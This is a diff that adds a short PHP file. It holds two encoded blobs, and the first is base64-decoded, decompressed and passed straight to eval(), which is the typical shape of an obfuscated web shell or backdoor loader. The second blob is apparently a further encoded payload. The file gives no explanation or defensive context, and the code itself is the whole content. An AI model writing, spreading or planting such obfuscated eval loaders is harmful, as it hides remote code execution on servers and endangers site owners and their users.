@@ -1,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "=IVvGULJCnss307884z886P1oHvY+hThbqfzO2hnGJG5tKxclP7lyxdk5ssV6QS/PexVX7r/Ty26luF1JFjOiU/tVJjIpazTfRyTbKy9FfJZM2beMvls3R2gXd8lJtIMIMjrDQj+MURZs4XHc0WgT2whbHmneIQrvxWbV/Ofk/bzGbsNQlhWmLj6EUIyvltMfJLbI8aKsjWfSpOYVipcmJouXCyl17I4bxQ84urtnuI7/qXI+ssF7XtjX+zkGpEZI/+TZQzX/7guImEjd5BPpx03cJ5OzLaGWQgwp3+b9SfzN84gO1HFofVzqi+EnDnZdhqIcDsKZG1WKABNUIXJy6B+9eQZusbQhhZzMEA6WRobr4lX4PWgZNDlCRbJRXZCo1KUdRFwXGh7D+xukr01YZJmP8zOHiLR4cenRVJB/lRTEsSFWGAMrEEKPxnKxG2rxnd2Z2dpLy+dJBNqox2d8HUaOVSHuaRoz6IW86Xh8VAC5JngqOouSU6cqFhScWZVg9PlPyHEwM+TdFVjcin/2FQiBwJe+vWAUGg/mFQmB4fYB4ZA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
